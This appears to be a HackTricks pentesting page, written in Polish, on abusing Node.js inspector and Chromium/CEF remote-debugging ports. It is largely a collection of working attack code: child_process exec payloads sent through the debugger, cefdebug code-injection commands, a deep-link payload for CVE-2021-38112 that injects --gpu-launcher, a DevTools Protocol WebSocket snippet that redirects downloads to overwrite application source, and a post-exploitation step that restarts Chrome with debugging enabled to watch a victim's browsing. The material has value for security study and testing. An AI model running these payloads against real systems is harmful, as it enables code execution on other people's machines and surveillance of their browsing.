# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

[Z dokumentacji](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Po uruchomieniu z przełącznikiem `--inspect` proces Node.js nasłuchuje na klienta debugowania. **Domyślnie** nasłuchuje na hoście i porcie **`127.0.0.1:9229`**. Każdy proces otrzymuje również **unikalny** **UUID**.<sup>[[4]](#references)</sup>

Klienci Inspectora muszą znać i określić adres hosta, port oraz UUID, aby się połączyć. Pełny URL będzie wyglądał mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Ponieważ **debugger ma pełny dostęp do środowiska wykonywania Node.js**, złośliwy actor, który może połączyć się z tym portem, może być w stanie wykonać dowolny kod w imieniu procesu Node.js (**potencjalna eskalacja uprawnień**).

Istnieje kilka sposobów uruchomienia Inspectora:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Po uruchomieniu inspekcjonowanego procesu pojawi się coś takiego:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesy oparte na **CEF** (**Chromium Embedded Framework**) muszą używać parametru: `--remote-debugging-port=9222`, aby otworzyć **debugger** (zabezpieczenia przed SSRF pozostają bardzo podobne). Jednak zamiast udostępniać sesję **debug** **NodeJS**, będą komunikować się z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), czyli interfejsu do sterowania przeglądarką, ale nie zapewnia to bezpośredniego RCE.<sup>[[5]](#references)</sup>

Po uruchomieniu przeglądarki w trybie debugowania pojawi się coś takiego:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Przeglądarki, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w web-browserze mogą wykonywać żądania WebSocket i HTTP w ramach modelu bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest niezbędne do **uzyskania unikalnego identyfikatora sesji debuggera**. **Same-origin-policy** **uniemożliwia** stronom internetowym nawiązanie **tego połączenia HTTP**. W celu zapewnienia dodatkowej ochrony przed [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js sprawdza, czy **nagłówki „Host”** połączenia dokładnie określają **adres IP**, **`localhost`** lub **`localhost6`**.<sup>[[12]](#references)</sup>

> [!TIP]
> Te **środki bezpieczeństwa uniemożliwiają wykorzystanie inspectora** do uruchamiania kodu poprzez **samo wysłanie żądania HTTP** (co byłoby możliwe przy wykorzystaniu luki SSRF).

### Uruchamianie inspectora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu Node.js, aby spowodować **uruchomienie inspectora** na domyślnym porcie. Pamiętaj jednak, że musisz mieć wystarczające uprawnienia, więc może to zapewnić **uprzywilejowany dostęp do informacji wewnątrz procesu**, ale nie bezpośrednią eskalację uprawnień.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Jest to przydatne w kontenerach, ponieważ **zatrzymanie procesu i uruchomienie nowego** z opcją `--inspect` **nie wchodzi w grę**, gdyż **kontener** zostanie **zabity** razem z procesem.

### Połączenie z inspector/debugger

Aby połączyć się z **przeglądarką opartą na Chromium**, można uzyskać dostęp do adresów `chrome://inspect` lub `edge://inspect`, odpowiednio dla Chrome lub Edge. Po kliknięciu przycisku Configure należy upewnić się, że **docelowy host i port** są prawidłowo wymienione. Obraz przedstawia przykład Remote Code Execution (RCE):

![Po uzyskaniu adresu URL umożliwiającego dostęp do debuggera pojawi się on, np. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Połączenie z inspector/debugger: Aby połączyć się z przeglądarką opartą na Chromium,...](<../../images/image (674).png>)

Za pomocą **wiersza poleceń** można połączyć się z debuggerem/inspectorem przy użyciu:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) umożliwia **znajdowanie inspektorów** działających lokalnie i **wstrzykiwanie do nich kodu**.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Pamiętaj, że exploity **RCE w NodeJS** nie zadziałają, jeśli połączono się z przeglądarką za pośrednictwem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (musisz sprawdzić API, aby znaleźć interesujące rzeczy, które można z nim zrobić).

## RCE w debuggerze/inspektorze NodeJS

> [!TIP]
> Jeśli trafiłeś tutaj, szukając informacji o tym, jak uzyskać [**RCE z XSS w Electronie, sprawdź tę stronę.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Niektóre popularne sposoby uzyskania **RCE**, gdy możesz **połączyć się** z **inspectorem** Node, polegają na użyciu czegoś takiego (wygląda na to, że **nie zadziała to w połączeniu z Chrome DevTools protocol**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Ładunki Chrome DevTools Protocol

API można sprawdzić tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
W tej sekcji wymienię interesujące rzeczy, które, jak odkryłem, były wykorzystywane przez ludzi do exploitowania tego protokołu.

### Wstrzykiwanie parametrów za pomocą Deep Links

W [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) firma Rhino Security odkryła, że aplikacja oparta na CEF **zarejestrowała niestandardowy UR**I w systemie (workspaces://index.html), który otrzymywał pełny URI, a następnie **uruchamiała aplikacj**ę opartą na CEF z konfiguracją częściowo konstruowaną na podstawie tego URI.<sup>[[8]](#references)</sup>

Odkryto, że parametry URI były dekodowane za pomocą URL decoding i używane do uruchomienia podstawowej aplikacji CEF, co pozwalało użytkownikowi **wstrzyknąć** flagę **`--gpu-launcher`** do **linii poleceń** i wykonywać dowolne działania.

Zatem payload taki jak:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wykona calc.exe.

### Nadpisywanie plików

Zmień folder, w którym będą zapisywane **pobrane pliki**, i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE i eksfiltracja

Zgodnie z tym postem: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) możliwe jest uzyskanie RCE i eksfiltracja wewnętrznych stron z theriver.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

W rzeczywistym środowisku i **po przejęciu** komputera użytkownika korzystającego z przeglądarki opartej na Chrome/Chromium można uruchomić proces Chrome z **włączonym debuggingiem i przekierować port debugowania**, aby uzyskać do niego dostęp. W ten sposób można **inspekcjonować wszystko, co ofiara robi w Chrome, i wykradać poufne informacje**.<sup>[[7]](#references)</sup>

Stealthowy sposób polega na **zakończeniu każdego procesu Chrome**, a następnie wywołaniu czegoś takiego jak
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Odnośniki

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - narzędzie do inspekcji i exploitation debuggera CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution w Visual Studio Code za pośrednictwem debuggera Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Przewodnik po debugowaniu Node.js - rozpoczęcie pracy](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: nadużywanie funkcji debugowania Chrome do zdalnego obserwowania i kontrolowania sesji przeglądania](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution w AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE za pośrednictwem DNS Rebinding i CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (tracker błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (tracker błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (tracker błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
